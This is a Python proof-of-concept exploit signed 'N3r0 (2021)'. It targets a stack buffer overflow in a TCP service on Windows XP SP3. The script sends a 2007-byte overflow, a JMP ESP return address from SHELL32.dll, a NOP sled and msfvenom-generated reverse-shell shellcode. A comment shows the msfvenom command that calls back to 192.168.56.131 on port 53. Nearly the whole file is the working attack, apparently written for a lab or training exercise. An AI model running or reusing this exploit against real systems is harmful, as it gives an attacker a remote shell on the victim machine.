#!/usr/bin/env python3

import socket
import sys

global s
# 6200 crashes the program
# After sending 2007 characters we will reach the EIP location
# JMP ESP = 7CB32D69 in SHELL32.dll Windows XP SP3 32bit
# Bad characters = \x00\x0a\x0d\xff
# Reverse shell payload:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.131 EXITFUNC=thread LPORT=53 -b '\x00\x0a\x0d\xff' -f python
def connect():
	shellcode =  ""
	shellcode += "\xbd\x09\x50\xda\x96\xdb\xcd\xd9\x74\x24\xf4"
	shellcode += "\x5a\x2b\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e"
	shellcode += "\x03\x63\x5e\x38\x63\x8f\xb6\x3e\x8c\x6f\x47"
	shellcode += "\x5f\x04\x8a\x76\x5f\x72\xdf\x29\x6f\xf0\x8d"
	shellcode += "\xc5\x04\x54\x25\x5d\x68\x71\x4a\xd6\xc7\xa7"
	shellcode += "\x65\xe7\x74\x9b\xe4\x6b\x87\xc8\xc6\x52\x48"
	shellcode += "\x1d\x07\x92\xb5\xec\x55\x4b\xb1\x43\x49\xf8"
	shellcode += "\x8f\x5f\xe2\xb2\x1e\xd8\x17\x02\x20\xc9\x86"
	shellcode += "\x18\x7b\xc9\x29\xcc\xf7\x40\x31\x11\x3d\x1a"
	shellcode += "\xca\xe1\xc9\x9d\x1a\x38\x31\x31\x63\xf4\xc0"
	shellcode += "\x4b\xa4\x33\x3b\x3e\xdc\x47\xc6\x39\x1b\x35"
	shellcode += "\x1c\xcf\xbf\x9d\xd7\x77\x1b\x1f\x3b\xe1\xe8"
	shellcode += "\x13\xf0\x65\xb6\x37\x07\xa9\xcd\x4c\x8c\x4c"
	shellcode += "\x01\xc5\xd6\x6a\x85\x8d\x8d\x13\x9c\x6b\x63"
	shellcode += "\x2b\xfe\xd3\xdc\x89\x75\xf9\x09\xa0\xd4\x96"
	shellcode += "\xfe\x89\xe6\x66\x69\x99\x95\x54\x36\x31\x31"
	shellcode += "\xd5\xbf\x9f\xc6\x1a\xea\x58\x58\xe5\x15\x99"
	shellcode += "\x71\x22\x41\xc9\xe9\x83\xea\x82\xe9\x2c\x3f"
	shellcode += "\x04\xb9\x82\x90\xe5\x69\x63\x41\x8e\x63\x6c"
	shellcode += "\xbe\xae\x8c\xa6\xd7\x45\x77\x21\x18\x31\x4f"
	shellcode += "\x32\xf0\x40\xaf\x34\x34\xcc\x49\x5e\x26\x98"
	shellcode += "\xc2\xf7\xdf\x81\x98\x66\x1f\x1c\xe5\xa9\xab"
	shellcode += "\x93\x1a\x67\x5c\xd9\x08\x10\xac\x94\x72\xb7"
	shellcode += "\xb3\x02\x1a\x5b\x21\xc9\xda\x12\x5a\x46\x8d"
	shellcode += "\x73\xac\x9f\x5b\x6e\x97\x09\x79\x73\x41\x71"
	shellcode += "\x39\xa8\xb2\x7c\xc0\x3d\x8e\x5a\xd2\xfb\x0f"
	shellcode += "\xe7\x86\x53\x46\xb1\x70\x12\x30\x73\x2a\xcc"
	shellcode += "\xef\xdd\xba\x89\xc3\xdd\xbc\x95\x09\xa8\x20"
	shellcode += "\x27\xe4\xed\x5f\x88\x60\xfa\x18\xf4\x10\x05"
	shellcode += "\xf3\xbc\x31\xe4\xd1\xc8\xd9\xb1\xb0\x70\x84"
	shellcode += "\x41\x6f\xb6\xb1\xc1\x85\x47\x46\xd9\xec\x42"
	shellcode += "\x02\x5d\x1d\x3f\x1b\x08\x21\xec\x1c\x19"

	EIP = "\x69\x2d\xb3\x7c"
	nops = "\x90" * 20
	data = "\x41" * 2007 + EIP + nops + shellcode
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a socket for TCP connection
	s.connect((sys.argv[1],int(sys.argv[2]))) # Connects to given ip and port by the user (E.g python3 exploit.py 192.168.45.134 21)
	print(s.recv(1024)) # Prints to the screen the data recieved from the server when established the TCP connection
	s.send(bytes(data,'latin-1')) # Sends the payload
	print("%d bytes has been sended to the target \n" % len(data))
	s.close()

def main():
	print("----------------------------------------------------------\n")
	print("\tProof Of Concept created by N3r0 (2021)\n")
	print("----------------------------------------------------------\n")
	connect()
	print("Check your netcat listener!\n")

if __name__ == "__main__":
    main()
